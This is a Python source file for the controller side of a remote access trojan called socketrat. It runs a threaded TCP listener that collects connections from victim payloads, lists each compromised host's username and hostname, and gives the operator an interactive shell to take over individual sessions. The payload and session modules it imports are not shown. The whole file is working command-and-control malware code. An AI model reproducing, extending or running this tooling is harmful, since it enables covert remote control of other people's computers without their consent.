# -*- coding: utf-8 -*-

import cmd
import os
import socket
import socketserver
import sys
import threading
import time
import traceback

import tabulate

from . import sock
from .payload import session


class SimpleRATRequestHandler(socketserver.BaseRequestHandler):
    
    def setup(self):
        #self.client_address
        self.request.settimeout(5)
        self.session = session.Session(self.request)
        self.server.add_session(self.session)

    def handle(self):
        while not self.server.server_closed:
            time.sleep(1)
            #if self.session.last_response > ...
            try:
                self.session.rpc.echo('hello?')
            except socket.timeout:
                #TODO: maybe have max retry for response?
                #      For now just disconnect.
                break
            except sock.ConnectionClosed:
                break
            except (ConnectionResetError, BrokenPipeError, OSError):
                break
            except:
                # unknown error.
                traceback.print_exc()
                pass

    def finish(self):
        self.session.close()
        self.server.remove_session(self.session)


class RATServer(socketserver.TCPServer):
    allow_reuse_address = True

    RequestHandler = SimpleRATRequestHandler
    SessionContainer = session.SessionContainer

    def __init__(self, server_address, RequestHandler=None, *args, **kwargs):
        if RequestHandler is not None:
            self.RequestHandler = RequestHandler
        self.sessions = self.SessionContainer()
        self._close_event = threading.Event()
        super().__init__(server_address, self.RequestHandler, *args, **kwargs)

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

    def close(self):
        self.server_close()
        for s in self.sessions.values():
            s.close()

    @property
    def server_closed(self):
        return self._close_event.is_set()

    def add_session(self, session):
        self.sessions.add(session)

    def remove_session(self, session):
        self.sessions.remove(session)

    def add_connection(self, address):
        pass


class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
    daemon_threads = True


class RATServerCmd(cmd.Cmd):
    intro = 'Welcome to the socketrat shell. Type help or ? to list commands.\n'
    prompt = '(socketrat) '

    SessionCmd = session.PayloadSessionCmd
    tablefmt = None

    def __init__(self, server, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.server = server
        if self.tablefmt is None:
            self.tablefmt = self._simple_tablefmt()

    @property
    def sessions(self):
        return self.server.sessions

    def _simple_tablefmt(self, ruler=None):
        if ruler is None:
            ruler = self.ruler
        return tabulate.TableFormat(
            lineabove=tabulate.Line('', ruler, ' ', ''),
            linebelowheader=tabulate.Line('', ruler, ' ', ''),
            linebetweenrows=None,
            linebelow=tabulate.Line('', ruler, ' ', ''),
            headerrow=tabulate.DataRow('', ' ', ''),
            datarow=tabulate.DataRow('', ' ', ''),
            padding=0,
            with_header_hide=['lineabove', 'linebelow'],
        )

    def cmdloop(self, intro=None, *args, **kwargs):
        '''Handle keyboard interrupts during cmdloop.'''
        try:
            super().cmdloop(intro=intro, *args, **kwargs)
        except KeyboardInterrupt:
            print()
        else:
            return

        while True:
            try:
                super().cmdloop(intro='', *args, **kwargs)
            except KeyboardInterrupt:
                print()
            else:
                return

    def onecmd(self, line):
        return super().onecmd(line)

    def emptyline(self):
        pass

    def default(self, line):
        self.error('Unknown syntax: {}'.format(line))

    def info(self, msg):
        print('*', msg.capitalize())

    def error(self, msg):
        print('***', msg.capitalize())

    def do_clear(self, line):
        '''Clear the screen.'''
        cmd = 'clear'
        if sys.platform.startswith('win'):
            cmd = 'cls'
        os.system(cmd)

    def do_connect(self, line):
        '''Connect to a bind payload.'''
        pass

    def do_sessions(self, line):
        '''Display connected clients.'''
        if not self.sessions:
            self.error('No clients connected')
            return

        headers = ['ID', 'Username', 'Hostname']
        table = [(s.id, s.username, s.hostname)
                for s in self.sessions.values()]

        t = tabulate.tabulate(table,
                headers=headers,
                tablefmt=self.tablefmt,
        )
        print('\n{}\n'.format(t))

    def do_exit(self, line):
        '''Exit the shell.'''
        return True

    def do_interact(self, line):
        '''Interact with a session.'''
        sessid = line
        if not sessid:
            self.error('Session ID required')
            return
        if sessid not in self.sessions:
            self.error('Unknown session id: {}'.format(sessid))
            return
        session = self.sessions[sessid]
        sh = self.SessionCmd(session)

        self.info('Interacting with session {} ...'.format(sessid))
        sh.cmdqueue.append('info')
        sh.cmdloop()
        self.info('Detached from session {}\n'.format(sessid))


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('--bind', '-b',
            metavar='ADDRESS',
            help='Specify alternate bind address '
                 '[default: all interfaces]',
            default='',
    )
    parser.add_argument('port',
            action='store',
            default=8000, type=int,
            nargs='?',
            help='Specify alternate port [default: 8000]',
    )
    args = parser.parse_args()

    host, port = addr = args.bind, args.port
    if not host:
        host = '0.0.0.0'
    if host == '127.0.0.1':
        host = 'localhost'

    with ThreadingRATServer(addr) as server:
        t = threading.Thread(target=server.serve_forever)
        t.daemon = True
        t.start()

        sh = RATServerCmd(server)

        print('Serving on {} port {} ...'.format(host, port))
        try:
            sh.cmdloop()
        finally:
            server.shutdown()
            print('Server stopped, exiting.')

